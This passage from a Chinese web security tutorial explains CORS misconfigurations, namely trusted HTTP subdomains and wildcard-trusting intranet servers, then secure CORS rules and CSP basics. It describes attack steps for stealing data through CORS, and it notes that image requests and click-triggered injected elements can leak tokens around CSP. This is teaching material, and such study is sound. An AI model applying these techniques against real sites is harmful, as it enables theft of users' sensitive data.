假设一个应用严格使用 HTTPS，但在白名单中包含了一个使用纯 HTTP 的受信任子域名。例如，应用收到如下请求：

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

应用返回：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

在这种情况下，能够劫持受害者流量的攻击者可以利用该 CORS 配置，危害受害者与应用之间的交互。攻击步骤如下：

1. 受害者发起任意一个纯 HTTP 请求。

2. 攻击者注入一个重定向，指向：

   ```
   http://trusted-subdomain.vulnerable-website.com
   ```

3. 受害者浏览器跟随该重定向。

4. 攻击者劫持该 HTTP 请求，并返回一个伪造的响应，其中包含向如下地址发起的 CORS 请求：

   ```
   https://vulnerable-website.com
   ```

5. 受害者浏览器发起该 CORS 请求，并携带如下源：

   ```
   http://trusted-subdomain.vulnerable-website.com
   ```

6. 应用因该源在白名单内而允许请求，并在响应中返回所请求的敏感数据。

7. 攻击者构造的伪造页面可以读取敏感数据，并将其发送到自己控制的任意域名。

即使存在漏洞的网站在其他方面严格使用 HTTPS、没有 HTTP 端点，且所有 Cookie 都标记为 Secure，该攻击依然有效。

\# 内网与无需凭证的 CORS 漏洞 大多数 CORS 攻击都依赖于响应头中存在： ``` Access-Control-Allow-Credentials: true ``` 如果没有该响应头，受害者的浏览器将不会发送其 Cookie，这意味着攻击者只能访问无需身份验证的内容，而这些内容攻击者通常直接访问目标网站即可轻易获取。 但是，有一种常见场景是攻击者**无法直接访问**目标网站的：当该网站属于组织内网、并部署在私有 IP 地址段内时。内部网站的安全标准通常低于公网站点，这使得攻击者更容易发现漏洞并进一步渗透。 例如，私有网络内的一次跨源请求可能如下所示： ```http GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com ``` 服务器响应： ```http HTTP/1.1 200 OK Access-Control-Allow-Origin: * ``` 应用服务器信任来自任意源的无凭证资源请求。如果处于私有 IP 网段内的用户访问公网，攻击者就可以在外部网站发起基于 CORS 的攻击，利用受害者的浏览器作为代理，访问内网资源。

------


## 6. CORS 安全配置规范

CORS 的本质是在不同源之间建立受控的信任关系，配置不当将直接导致敏感数据泄露、跨源请求伪造等严重安全风险。规范的安全配置需遵循以下要求：

1. 禁止无差别授权：严禁动态反射请求中的`Origin`字段值、将`null`源或通配符`*`加入生产环境的授权白名单，仅允许配置业务必需的、明确的可信源；
2. 最小权限原则：`Access-Control-Allow-Methods`与`Access-Control-Allow-Headers`仅配置业务必需的方法与头部，禁止无差别全量放开；
3. 凭证携带严格管控：仅当业务必需时才开启`Access-Control-Allow-Credentials: true`，同步收紧授权源范围，禁止与通配符配置共用；
4. 不可替代服务端鉴权：CORS 仅为浏览器端的跨源访问控制机制，无法防御服务端的未授权访问风险，服务器端必须对所有敏感接口执行独立的身份鉴权与权限校验。

------

## 7.可用资源

https://web.dev/articles/same-site-same-origin

https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy

https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

https://portswigger.net/web-security/cors



------

# 六、内容安全策略CSP

**CSP（Content Security Policy，内容安全策略）** 是一种浏览器强制执行的安全机制，通过**白名单策略**限制网页可加载的资源来源和执行方式，主要用于防御跨站脚本（XSS）、数据注入和点击劫持等代码执行类攻击。

CSP 本质上是网站向浏览器发送的一组 "安全指令"，告知浏览器：

- 允许加载哪些来源的脚本、样式、图片、字体、视频等资源
- 禁止执行内联脚本和动态代码（如`eval()`）
- 限制 AJAX 请求、WebSocket 连接的目标地址
- 控制页面能否被嵌入 iframe（防点击劫持）

要启用 CSP，响应中必须包含一个名为 `Content-Security-Policy` 的 HTTP 响应头，其值为具体的安全策略。策略由一条或多条指令组成，指令之间用分号分隔。也可以通过html的meta标签设置，请[参考MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP)

## 1.常见的配置

 **最严厉的配置（全锁定）**

```http
Content-Security-Policy: default-src 'self';
```

只允许加载来自**同一个源**（域名、协议、端口完全一致）的所有内容。禁止所有外链、禁止内联脚本、禁止 `eval()`。

**允许特定域名的脚本**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
```

默认只允许同源，但额外允许从 `https://trustedscripts.com` 加载 JavaScript。

**允许图片和外部样式，但不允许执行外部 JS**

```http
Content-Security-Policy: default-src 'self'; img-src *; style-src 'self' https://googleapis.com
```

图片可以来自任何地方（`*`），样式只允许同源和 Google 字体，其他资源必须同源。

**允许内联脚本**

```http
Content-Security-Policy: script-src 'self' 'unsafe-inline';
```

- 允许 `<script>alert(1)</script>` 这种写在 HTML 里的脚本运行。但这样会大幅降低防御 XSS 的效果。

------



## 2.使用 CSP 缓解 XSS 攻击

下面这条指令**只允许从页面自身同源加载脚本**：
```
script-src 'self'
```

下面这条指令**只允许从指定域名加载脚本**：
```
script-src https://scripts.normal-website.com
```

允许从外部域加载脚本时需要格外谨慎。如果攻击者有办法控制该外部域上返回的内容，就可能借此实施攻击。例如，不按客户区分 URL 的 CDN（如 `ajax.googleapis.com`）就不应被完全信任，因为第三方有可能在这些域名上放置可控内容。

除了白名单指定域名外，CSP 还提供另外两种指定可信资源的方式：**随机数（nonce）** 和 **哈希（hash）**：

- CSP 指令可以指定一个 nonce（随机值），加载脚本的标签中也必须使用相同的值。如果值不匹配，脚本就不会执行。为了起到有效防护，nonce 必须在每次页面加载时安全生成，且不能被攻击者猜测。
- CSP 指令可以指定可信脚本内容的哈希值。如果实际脚本的哈希与指令中的值不匹配，脚本就不会执行。如果脚本内容发生变化，你当然也需要更新指令里的哈希值。

CSP 通常会阻塞脚本这类资源。不过，很多 CSP 规则**仍然允许图片请求**。这意味着你常常可以利用 `<img>` 标签向外部服务器发起请求，以此泄露 CSRF Token 等信息。

部分浏览器（如 Chrome）内置了**悬挂标记防护（dangling markup mitigation）**，会阻止包含某些字符的请求，例如未经编码的原始换行符或尖括号。

有些策略限制更严格，会阻止所有形式的外部请求。但即便如此，仍然可以通过**诱导用户交互**绕过这类限制。要绕过这种策略，你需要注入一个 HTML 元素，当用户点击它时，会将注入元素包裹的所有内容存储并发送到外部服务器。



